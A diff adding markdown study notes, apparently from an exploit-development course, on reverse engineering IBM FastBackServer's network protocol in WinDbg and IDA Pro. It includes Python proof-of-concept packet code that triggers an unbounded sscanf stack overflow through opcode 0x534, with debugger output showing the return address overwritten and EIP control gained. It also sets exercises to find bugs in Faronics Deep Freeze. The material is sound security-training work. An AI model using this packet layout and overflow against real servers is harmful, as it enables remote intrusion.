+buf += pack("<i", 0x200)  # 2nd memcpy: size field
+buf += pack("<i", 0x300)  # 3rd memcpy: offset
+buf += pack("<i", 0x300)  # 3rd memcpy: size field
+buf += bytearray([0x41]*0x8)
+
+# psCommandBuffer
+buf += bytearray([0x42]*0x100) # 1st buffer
+buf += bytearray([0x43]*0x200) # 2nd buffer
+buf += bytearray([0x44]*0x300) # 3rd buffer
+...
+```
+
+Because of the access violation triggered, restart `FastBackServer`, set a breakpoint just before the 1st `memcpy` at `FastBackServer!FXCLI_OraBR_Exec_Command+0x43b`, and execute our PoC:
+
+`bp FastBackServer!FXCLI_OraBR_Exec_Command+0x43b`
+
+`g`
+
+```
+Breakpoint 0 hit
+FastBackServer!FXCLI_OraBR_Exec_Command+0x43b:
+0056c8f1 e84aa50f00      call    FastBackServer!memcpy (00666e40)
+```
+
+`dd esp L3`
+
+```
+0d2ee328  0d343b30 071d6c0c 00000100
+```
+
+`dd 071d6c0c`
+
+```
+071d6c0c  42424242 42424242 42424242 42424242
+071d6c1c  42424242 42424242 42424242 42424242
+071d6c2c  42424242 42424242 42424242 42424242
+071d6c3c  42424242 42424242 42424242 42424242
+071d6c4c  42424242 42424242 42424242 42424242
+071d6c5c  42424242 42424242 42424242 42424242
+071d6c6c  42424242 42424242 42424242 42424242
+071d6c7c  42424242 42424242 42424242 42424242
+```
+
+Step over the 3 `memcpy` calls without triggering any exception:
+
+```
+FastBackServer!FXCLI_OraBR_Exec_Command+0x481:
+0056c937 e804a50f00      call    FastBackServer!memcpy (00666e40)
+```
+
+`dd poi(esp+4)`
+
+```
+071d6d0c  43434343 43434343 43434343 43434343
+071d6d1c  43434343 43434343 43434343 43434343
+071d6d2c  43434343 43434343 43434343 43434343
+071d6d3c  43434343 43434343 43434343 43434343
+071d6d4c  43434343 43434343 43434343 43434343
+071d6d5c  43434343 43434343 43434343 43434343
+071d6d6c  43434343 43434343 43434343 43434343
+071d6d7c  43434343 43434343 43434343 43434343
+...
+```
+
+```
+FastBackServer!FXCLI_OraBR_Exec_Command+0x4c7:
+0056c97d e8bea40f00      call    FastBackServer!memcpy (00666e40)
+```
+
+`dd poi(esp+4)`
+
+```
+071d6f0c  44444444 44444444 44444444 44444444
+071d6f1c  44444444 44444444 44444444 44444444
+071d6f2c  44444444 44444444 44444444 44444444
+071d6f3c  44444444 44444444 44444444 44444444
+071d6f4c  44444444 44444444 44444444 44444444
+071d6f5c  44444444 44444444 44444444 44444444
+071d6f6c  44444444 44444444 44444444 44444444
+071d6f7c  44444444 44444444 44444444 44444444
+```
+
+After the last `memcpy`, we reach an interesting basic block:
+
+```nasm
+mov     byte ptr [ebp+ecx-12518h],0
+mov dword ptr [ebp-1251Ch],0
+mov     edx,dword ptr [ebp-0C370h]
+cmp     dword ptr [edx+0Ch],1090h
+jz      FastBackServer!FXCLI_OraBR_Exec_Command+0x69d (0056cb53)
+```
+
+Single-stepping to the instruction (`cmp dword ptr [edx+0Ch],1090h`) in WinDbg:
+
+```
+0056c9a6 817a0c90100000  cmp     dword ptr [edx+0Ch],1090h ds:0023:05f1c88c=41414141
+```
+
+`dd edx`
+
+```
+05f1c880  41414141 41414141 04edf020 41414141
+05f1c890  00000000 00000100 00000100 00000200
+05f1c8a0  00000300 00000300 41414141 071d6c08
+05f1c8b0  14b8f413 081d9b71 4c435846 534d5f49
+05f1c8c0  00005147 00000000 00000000 00000000
+05f1c8d0  00000000 00000000 00000000 00000000
+05f1c8e0  00000000 00000000 00000000 00000000
+05f1c8f0  00000000 00000000 00000000 00000000
+```
+
+The `EDX` register points to the beginning of our header.
+
+The DWORD used for the comparison is located at offset `0x0C` from `psAgentCommand`.
+
+Follow the chain of basic blocks:
+
+```nasm
+mov     [ebp+var_1251C], 0
+mov     edx, [ebp+psAgentCommand]
+cmp     dword ptr [edx+0Ch], 1090h
+jz      loc_56CB53
+mov     eax, [ebp+psAgentCommand]
+cmp     dword ptr [eax+0Ch], 903h
+jz      loc_56CB53
+mov     ecx, [ebp+psAgentCommand]
+cmp     dword ptr [ecx+0Ch], 508h
+jz      loc_56CB53
+mov     edx, [ebp+psAgentCommand]
+cmp     dword ptr [edx+0Ch], 1070h
+jz      loc_56CB53
+mov     eax, [ebp+psAgentCommand]
+cmp     dword ptr [eax+0Ch], 514h
+jz      loc_56CB53
+mov     ecx, [ebp+psAgentCommand]
+cmp     dword ptr [ecx+0Ch], 521h
+jz      loc_56CB53
+mov     edx, [ebp+psAgentCommand]
+cmp     dword ptr [edx+0Ch], 1104h
+jz      loc_56CB53
+mov     eax, [ebp+psAgentCommand]
+cmp     dword ptr [eax+0Ch], 1000h
+jz      loc_56CB53
+```
+
+These comparisons all use the same DWORD to determine the execution flow.
+
+We typically find code like this after the application finishes parsing the network protocol, then enabling us to **choose which functionality** to trigger within the target service.
+
+Follow the execution further down to `0x56CB53` in IDA Pro:
+ 
+```nasm
+mov     eax, [ebp+psAgentCommand]
+mov     ecx, [eax+0Ch]
+mov     [ebp+var_61B30], ecx
+cmp     [ebp+var_61B30], 1016h
+jg      loc_56CF6C
+```
+
+This block initiates the first of a series of comparisons between our controlled DWORD and all the application's valid opcodes.
+
+Follow one of these comparisons for opcode `0x500`:
+
+```nasm
+cmp     [ebp+var_61B30], 500h
+jz      loc_56DD33
+```
+ 
+In short, we can use the opcode DWORD to reach a good chunk of the `FastBackServer` functionality. This opens up the possibility to explore new execution paths and discover new vulnerabilities.
+
+Updating the layout of the packet to reflect the results of our analysis:
+
+- 0x00       : Checksum DWORD
+- 0x04 -> 0x30: psAgentCommand
+  - 0x04 -> 0xC:  Not used
+  - 0x10:         Opcode
+  - 0x14:         Offset for 1st copy operation
+  - 0x18:         Size of 1st copy operation
+  - 0x1C:         Offset for 2nd copy operation
+  - 0x20:         Size of 2nd copy operation
+  - 0x24:         Offset for 3rd copy operation
+  - 0x28:         Size of 3rd copy operation
+  - 0x2C -> 0x30: Not used
+- 0x34 -> End:  psCommandBuffer
+  - 0x34 + offset1 -> 0x34 + offset1 + size1: 1st buffer
+  - 0x34 + offset2 -> 0x34 + offset2 + size2: 2nd buffer
+  - 0x34 + offset3 -> 0x34 + offset3 + size3: 3rd buffer
+
+
+### Going Down `0x534`
+
+We have reached the main branching location inside `FXCLI_OraBR_Exec_Command`.
+
+When searching for vulnerabilities, differentiate between memory corruption vulnerabilities and logical vulnerabilities:
+
+- **Memory corruption** vulnerabilities will commonly occur during copy or move operations like `memcpy`, `memmov`, or `strcpy`, as well as operations like `sscanf`.
+
+- **Logical** vulnerabilities typically come down to implemented functions exposing a security risk, such as command injection or the ability to upload an executable file.
+
+To locate all vulnerabilities exposed by `FastBackServer!FXCLI_OraBR_Exec_Command`, examine the execution path associated with every opcode.
+
+We would typically approach this methodically by starting at the **lowest possible opcode** and moving upwards.
+
+Investigate a single function associated with opcode `0x534`.
+
+Update our PoC to contain 3 buffers of different size and a valid `psAgentCommand` buffer containing an opcode with a value set to `0x534`.
+
+We're choosing to investigate the execution path associated with this opcode because it contains a vulnerability that we will fully exploit in later modules.
+
+```python
+import socket
+import sys
+from struct import pack
+
+# Checksum
+buf = pack(">i", 0x630)
+# psAgentCommand
+buf += bytearray([0x41]*0xC)
+buf += pack("<i", 0x534)  # opcode
+buf += pack("<i", 0x0)    # 1st memcpy: offset
+buf += pack("<i", 0x100)  # 1st memcpy: size field
+buf += pack("<i", 0x100)  # 2nd memcpy: offset
+buf += pack("<i", 0x200)  # 2nd memcpy: size field
+buf += pack("<i", 0x300)  # 3rd memcpy: offset
+buf += pack("<i", 0x300)  # 3rd memcpy: size field
+buf += bytearray([0x41]*0x8)
+
+# psCommandBuffer
+buf += bytearray([0x42]*0x100) # 1st buffer
+buf += bytearray([0x43]*0x200) # 2nd buffer
+buf += bytearray([0x44]*0x300) # 3rd buffer
+...
+```
+
+Trace the updated packet by restarting FastBackServer and placing a breakpoint on the 1st opcode comparison at `FXCLI_OraBR_Exec_Command+0x6ac`.
+
+`bp FastBackServer!FXCLI_OraBR_Exec_Command+0x6ac`
+
+`g`
+
+```
+Breakpoint 0 hit
+FastBackServer!FXCLI_OraBR_Exec_Command+0x6ac:
+0056cb62 81bdd0e4f9ff16100000 cmp dword ptr [ebp-61B30h],1016h ss:0023:0dafe368=00000534
+```
+
+`u eip L10`
+
+```
+FastBackServer!FXCLI_OraBR_Exec_Command+0x6ac:
+0056cb62 81bdd0e4f9ff16100000 cmp dword ptr [ebp-61B30h],1016h
+0056cb6c 0f8ffa030000    jg      FastBackServer!FXCLI_OraBR_Exec_Command+0xab6 (0056cf6c)
+0056cb72 81bdd0e4f9ff16100000 cmp dword ptr [ebp-61B30h],1016h
+0056cb7c 0f846a650000    je      FastBackServer!FXCLI_OraBR_Exec_Command+0x6c36 (005730ec)
+0056cb82 81bdd0e4f9ff54050000 cmp dword ptr [ebp-61B30h],554h
+0056cb8c 0f8fb4010000    jg      FastBackServer!FXCLI_OraBR_Exec_Command+0x890 (0056cd46)
+0056cb92 81bdd0e4f9ff54050000 cmp dword ptr [ebp-61B30h],554h
+0056cb9c 0f84c3320000    je      FastBackServer!FXCLI_OraBR_Exec_Command+0x39af (0056fe65)
+0056cba2 81bdd0e4f9ff17050000 cmp dword ptr [ebp-61B30h],517h
+0056cbac 0f8f60010000    jg      FastBackServer!FXCLI_OraBR_Exec_Command+0x85c (0056cd12)
+0056cbb2 81bdd0e4f9ff17050000 cmp dword ptr [ebp-61B30h],517h
+0056cbbc 0f84512e0000    je      FastBackServer!FXCLI_OraBR_Exec_Command+0x355d (0056fa13)
+0056cbc2 81bdd0e4f9ff01050000 cmp dword ptr [ebp-61B30h],501h
+0056cbcc 0f8f0c010000    jg      FastBackServer!FXCLI_OraBR_Exec_Command+0x828 (0056ccde)
+0056cbd2 81bdd0e4f9ff01050000 cmp dword ptr [ebp-61B30h],501h
+0056cbdc 0f8470110000    je      FastBackServer!FXCLI_OraBR_Exec_Command+0x189c (0056dd52)
+```
+
+We now face a list of subsequent comparisons against the supplied opcode.
+
+By single-stepping through the instructions, we reach the following basic block where the program code subtracts `0x518` from the supplied opcode.
+ 
+```nasm
+mov     edx, [ebp+var_61B30]
+sub     edx, 518h
+mov     [ebp+var_61B30], edx
+cmp     [ebp+var_61B30], 3Bh ; switch 60 cases
+ja      loc_575A55      ; jumptable 0056CD0B default case
+```
+
+The result of this operation (`0x534 - 0x518 = 0x1C`) is compared against the `0x3B` value. 
+
+Since `0x1C` < `0x3B`, the jump at the end of the basic block is not taken and we arrive at the switch condition:
+ 
+```nasm
+mov     ecx, [ebp+var_61B30]
+xor     eax, eax
+mov     al, ds:byte_575F6E[ecx]
+jmp     ds:off_575F06[eax*4] ; switch jump
+```
+
+- The set of instructions copies the result (`0x1C`) into `ECX`.
+
+- This register is then used as an index into a byte array starting at address `0x575F6E`, to fetch a single byte into `AL`.
+
+- The value in `AL` is multiplied by `0x4` and used as an index into the array starting at address `0x575F06`.
+
+- The retrieved pointer from the array will be the address where execution is transferred to, through the jump instruction (`0x56CD3F`).
+
+The assembly code in the basic block analyzed above is commonly referred to as a **jump table** or branch table.
+
+```
+FastBackServer!FXCLI_OraBR_Exec_Command+0x87b:
+0056cd31 8b8dd0e4f9ff    mov     ecx,dword ptr [ebp-61B30h] ss:0023:0dafe368=0000001c
+```
+
+`p`
+
+```
+ecx=0000001c
+FastBackServer!FXCLI_OraBR_Exec_Command+0x881:
+0056cd37 33c0            xor     eax,eax
+```
+
+`p`
+
+```
+eax=00000000 ecx=0000001c
+FastBackServer!FXCLI_OraBR_Exec_Command+0x883:
+0056cd39 8a816e5f5700    mov     al,byte ptr FastBackServer!FXCLI_OraBR_Exec_Command+0x9ab8 (00575f6e)[ecx] ds:0023:00575f8a=10
+```
+
+`db 00575f6e+1c L1`
+
+```
+00575f8a  10                                               .
+```
+
+`p`
+
+```
+eax=00000010
+FastBackServer!FXCLI_OraBR_Exec_Command+0x889:
+0056cd3f ff2485065f5700  jmp     dword ptr FastBackServer!FXCLI_OraBR_Exec_Command+0x9a50 (00575f06)[eax*4] ds:0023:00575f46=00572e27
+```
+
+`dd 00575f06+10*4 L1`
+
+```
+00575f46  00572e27
+```
+
+`p`
+
+```
+FastBackServer!FXCLI_OraBR_Exec_Command+0x6971:
+00572e27 668b85acdafeff  mov     ax,word ptr [ebp-12554h] ss:0023:0db4d944=1a8e
+```
+
+After the execution of the jumptable, we arrive at address `0x572e27` in `FXCLI_OraBR_Exec_Command`.
+
+Let's align IDA Pro with our dynamic analysis at address `0x572e27`, and we'll find the next basic block demonstrated below.
+
+```nasm
+mov     ax, [ebp+var_12554] ; jumptable 0056CD3F case 28
+push    eax             ; int
+mov     ecx, dword ptr [ebp+var_12558]
+push    ecx             ; char
+lea     edx, [ebp+var_C36C]
+push    edx             ; int
+lea     eax, [ebp+Source]
+push    eax             ; void *
+lea     ecx, [ebp+Dst]
+push    ecx             ; Src
+mov     edx, [ebp+psAgentCommand_0x10]
+push    edx             ; int
+call    _FXCLI_SetConfFileChunk
+add     esp, 18h
+```
+ 
+The main task of this basic block is to set up arguments for the call to `FXCLI_SetConfFileChunk`.
+
+If we single-step to the call instruction in WinDbg and dump the arguments for the call, we will find the `psAgentCommand` buffer, along with the 1st and 3rd buffer from the `psCommandBuffer`:
+
+```
+FastBackServer!FXCLI_OraBR_Exec_Command+0x699c:
+00572e52 e8b45e0000      call    FastBackServer!FXCLI_SetConfFileChunk (00578d0b)
+```
+
+`dd esp L6`
+
+```
+0dafe31c  0602c890 0db53b30 0db4d980 0db53b2c
+0dafe32c  90b0a8c0 00001a8e
+```
+
+`dd 0602c890`
+
+```
+0602c890  00000000 00000100 00000100 00000200
+0602c8a0  00000300 00000300 41414141 06ff1c08
+0602c8b0  9b7083b6 081d6f84 4c435846 534d5f49
+0602c8c0  00005147 00000000 00000000 00000000
+0602c8d0  00000000 00000000 00000000 00000000
+0602c8e0  00000000 00000000 00000000 00000000
+0602c8f0  00000000 00000000 00000000 00000000
+0602c900  00000000 00000000 00000000 00000000
+```
+
+`dd 0db53b30`
+
+```
+0db53b30  42424242 42424242 42424242 42424242
+0db53b40  42424242 42424242 42424242 42424242
+0db53b50  42424242 42424242 42424242 42424242
+0db53b60  42424242 42424242 42424242 42424242
+0db53b70  42424242 42424242 42424242 42424242
+0db53b80  42424242 42424242 42424242 42424242
+0db53b90  42424242 42424242 42424242 42424242
+0db53ba0  42424242 42424242 42424242 42424242
+```
+
+`dd 0db4d980`
+
+```
+0db4d980  44444444 44444444 44444444 44444444
+0db4d990  44444444 44444444 44444444 44444444
+0db4d9a0  44444444 44444444 44444444 44444444
+0db4d9b0  44444444 44444444 44444444 44444444
+0db4d9c0  44444444 44444444 44444444 44444444
+0db4d9d0  44444444 44444444 44444444 44444444
+0db4d9e0  44444444 44444444 44444444 44444444
+0db4d9f0  44444444 44444444 44444444 44444444
+```
+
+Examining the `FXCLI_SetConfFileChunk` function, we find a call to `sscanf`.
+
+This function is interesting because, depending on its input arguments, it can produce a **memory corruption vulnerability**.
+ 
+```nasm
+lea     eax, [ebp+var_8]
+push    eax
+lea     ecx, [ebp+var_C]
+push    ecx
+lea     edx, [ebp+var_318]
+push    edx
+lea     eax, [ebp+var_4]
+push    eax
+lea     ecx, [ebp+Str1]
+push    ecx
+push    offset $SG128695 ; "File: %s From: %d To: %d ChunkLoc: %d F"...
+mov     edx, [ebp+Src]
+push    edx             ; Src
+call    _sscanf
+add     esp, 1Ch
+```
+
+`sscanf` function prototype:
+
+```C
+int sscanf(const char *buffer, const char *format, ... );
+```
+
+The 1st argument (`*buffer`) is the source buffer.
+
+The 2nd argument (`*format`) is a format string specifier, which decides how the source buffer is interpreted.
+
+Depending on the format string specifier, the source buffer is split and copied into the optional argument buffers given as "...":
+
+Single step up to the call and dump the arguments from the stack:
+
+```
+FastBackServer!FXCLI_SetConfFileChunk+0x40:
+00578d4b e8d5e70e00      call    FastBackServer!sscanf (00667525)
+```
+
+`dd esp L7`
+
+```
+0dafdbc0  0db53b30 0085b0dc 0dafe204 0dafe310
+0dafdbd0  0dafdffc 0dafe308 0dafe30c
+```
+
+`dd 0db53b30`
+
+```
+0db53b30  42424242 42424242 42424242 42424242
+0db53b40  42424242 42424242 42424242 42424242
+0db53b50  42424242 42424242 42424242 42424242
+0db53b60  42424242 42424242 42424242 42424242
+0db53b70  42424242 42424242 42424242 42424242
+0db53b80  42424242 42424242 42424242 42424242
+0db53b90  42424242 42424242 42424242 42424242
+0db53ba0  42424242 42424242 42424242 42424242
+```
+
+`da 0085b0dc`
+
+```
+0085b0dc  "File: %s From: %d To: %d ChunkLo"
+0085b0fc  "c: %d FileLoc: %d"
+```
+
+The `source` buffer is the 1st `psCommandBuffer` and the format string specifier is the highlighted ASCII string.
+
+Identify how the format string specifier is interpreted by going through each "%" sign in the ASCII string.
+
+1. `%s`: the source buffer must contain a null-terminated string. This string will be copied into the address supplied in the 3rd argument.
+
+2. `%d` specifier: we read a decimal integer after the null-terminated string and copy it into the address supplied by the 4th argument, and so forth.
+
+If a vulnerability is present, we'll find it in the copy of the null-terminated string because **no size parameter is supplied** in the call to `sscanf` and no validation is performed on the input.
+
+There is also no way of knowing beforehand how large the destination buffer supplied by the 3rd argument must be.
+
+We can supply a network packet up to `0x4400` bytes in size, consisting of a `psCommandBuffer` up to `0x43CC` bytes.
+
+If the destination buffer is smaller than this, we can overflow it and write beyond it. If the destination buffer is on the stack at a lower address than a return address, we can leverage it to gain control of EIP.
+
+The destination buffer `0dafe204` is within the upper and lower bounds of the stack:
+
+`dd esp L7`
+
+```
+0dafdbc0  0db53b30 0085b0dc 0dafe204 0dafe310
+0dafdbd0  0dafdffc 0dafe308 0dafe30c
+```
+
+`!teb`
+
+```
+TEB at 0035d000
+    ExceptionList:        0db5ff38
+    StackBase:            0db60000
+    StackLimit:           0dafd000
+    SubSystemTib:         00000000
+...
+```
+
+Find the distance from the destination buffer to a return address and determine if it < `0x43CC` bytes:
+
+`k`
+
+```
+ # ChildEBP RetAddr  
+00 0dafe314 00572e57 FastBackServer!FXCLI_SetConfFileChunk+0x40
+01 0db5fe98 0056a21f FastBackServer!FXCLI_OraBR_Exec_Command+0x69a1
+02 0db5feb4 00581366 FastBackServer!FXCLI_C_ReceiveCommand+0x130
+03 0db5fef0 0048ca98 FastBackServer!FX_AGENT_Cyclic+0x116
+04 0db5ff48 006693e9 FastBackServer!ORABR_Thread+0xef
+05 0db5ff80 76449564 FastBackServer!_beginthreadex+0xf4
+06 0db5ff94 772d293c KERNEL32!BaseThreadInitThunk+0x24
+07 0db5ffdc 772d2910 ntdll!__RtlUserThreadStart+0x2b
+08 0db5ffec 00000000 ntdll!_RtlUserThreadStart+0x1b
+```
+
+`dds 0dafe314 L2`
+
+```
+0dafe314  0db5fe98
+0dafe318  00572e57 FastBackServer!FXCLI_OraBR_Exec_Command+0x69a1
+```
+
+`? 0dafe318 - 0dafe204`
+
+```
+Evaluate expression: 276 = 00000114
+```
+
+The distance from the destination buffer to the 1st return address is only `0x114` bytes. We can easily craft a packet that will overflow its limits.
+
+The source buffer must be crafted according to the `sscanf` format string, which the API uses to parse each value. The first portion of the `psCommandBuffer` buffer must contain a very large ASCII string after the `File:` marker.
+
+Draft a simple PoC using a length of `0x200`. We can ignore the second and third `psCommandBuffers`:
+
+```python
+import socket
+import sys
+from struct import pack
+
+# psAgentCommand
+buf = bytearray([0x41]*0xC)
+buf += pack("<i", 0x534)  # opcode
+buf += pack("<i", 0x0)    # 1st memcpy: offset
+buf += pack("<i", 0x200)  # 1st memcpy: size field
+buf += pack("<i", 0x0)    # 2nd memcpy: offset
+buf += pack("<i", 0x100)  # 2nd memcpy: size field
+buf += pack("<i", 0x0)    # 3rd memcpy: offset
+buf += pack("<i", 0x100)  # 3rd memcpy: size field
+buf += bytearray([0x41]*0x8)
+
+# psCommandBuffer
+formatString = b"File: %s From: %d To: %d ChunkLoc: %d FileLoc: %d" % (b"A"*0x200,0,0,0,0)
+buf += formatString
+
+# Checksum
+buf = pack(">i", len(buf)-4) + buf
+...
+```
+
+The format string buffer is created through the `%` Python format string operator.
+
+The **checksum** value must match the length of the packet, so it is dynamically calculated at the end.
+
+Remove the existing breakpoints, set a new one on the call to `sscanf`, and then execute our PoC:
+
+`bc`
+
+`bp FastBackServer!FXCLI_SetConfFileChunk+0x40`
+
+`g`
+
+```
+Breakpoint 0 hit
+FastBackServer!FXCLI_SetConfFileChunk+0x40:
+00578d4b e8d5e70e00      call    FastBackServer!sscanf (00667525)
+```
+
+`dd esp L7`
+
+```
+0d79dbc0  0d7f3b30 0085b0dc 0d79e204 0d79e310
+0d79dbd0  0d79dffc 0d79e308 0d79e30c
+```
+
+`da 0d7f3b30`
+
+```
+0d7f3b30  "File: AAAAAAAAAAAAAAAAAAAAAAAAAA"
+0d7f3b50  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+0d7f3b70  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+0d7f3b90  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+0d7f3bb0  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+0d7f3bd0  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+0d7f3bf0  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+0d7f3c10  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+0d7f3c30  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+0d7f3c50  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+0d7f3c70  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+0d7f3c90  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+```
+
+The format string correctly set up with a very long ASCII string following the `File:` marker.
+
+Analyze the call stack before and after the call to `sscanf` to check if we can successfully overwrite the return address on the stack:
+
+`k L4`
+
+```
+ # ChildEBP RetAddr  
+00 0d79e314 00572e57 FastBackServer!FXCLI_SetConfFileChunk+0x40
+01 0d7ffe98 0056a21f FastBackServer!FXCLI_OraBR_Exec_Command+0x69a1
+02 0d7ffeb4 00581366 FastBackServer!FXCLI_C_ReceiveCommand+0x130
+03 0d7ffef0 0048ca98 FastBackServer!FX_AGENT_Cyclic+0x116
+```
+
+`p`
+
+```
+eax=00000001
+FastBackServer!FXCLI_SetConfFileChunk+0x45:
+00578d50 83c41c          add     esp,1Ch
+```
+
+`k`
+
+```
+ # ChildEBP RetAddr  
+00 0d79e314 41414141 FastBackServer!FXCLI_SetConfFileChunk+0x45
+WARNING: Frame IP not in any known module. Following frames may be wrong.
+01 0d79e318 41414141 0x41414141
+02 0d79e31c 41414141 0x41414141
+03 0d79e320 41414141 0x41414141
+04 0d79e324 41414141 0x41414141
+05 0d79e328 41414141 0x41414141
+06 0d79e32c 41414141 0x41414141
+...
+```
+
+The return address has been overwritten.
+
+Let execution continue and exit the current function to gain control of `EIP`:
+
+`g`
+
+```
+(1ab0.1320): Access violation - code c0000005 (first chance)
+41414141 ??              ???
+```
+
+We reverse engineered opcode `0x534` and found a bug that will likely lead to RCE.
+
+Since this is only one of many possible opcodes, several other vulnerabilities may exist in this application.
+
+## Extra Mile
+
+### FastBackServer
+
+Modify the PoC to use a different opcode and locate another vulnerability in the FastBackServer application.
+
+### Faronics Deep Freeze Enterprise Server
+
+Install an evaluation edition of Faronics Deep Freeze Enterprise Server from `C:\Installers\Faronics`. Anything can be entered as the customization code.
+
+Once the application is installed, use `TCPView` to locate listening ports for the `DFServerService.exe` application.
+
+Locate some of the multiple vulnerabilities in this application, including denial of service, memory corruption, and logical bugs. There are more than 15 vulnerabilities to find!
+
+Create a PoC script to trigger at least one of the memory corruption vulnerabilities.
+
+Note: The` DFServerService.exe` executable is packed with a `UPX` packer. IDA Pro is not able to parse it.
+
+Either use the `PE.Explorer_setup.exe` installer present in `C:\Installers\UPX` to install unpacking software, or use the already unpacked executable `DFServerServiceUnpacked.exe` also located in the `C:\Installers\UPX` folder.
 
 # Stack Overflows and DEP Bypass
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
 
 ```nasm
 
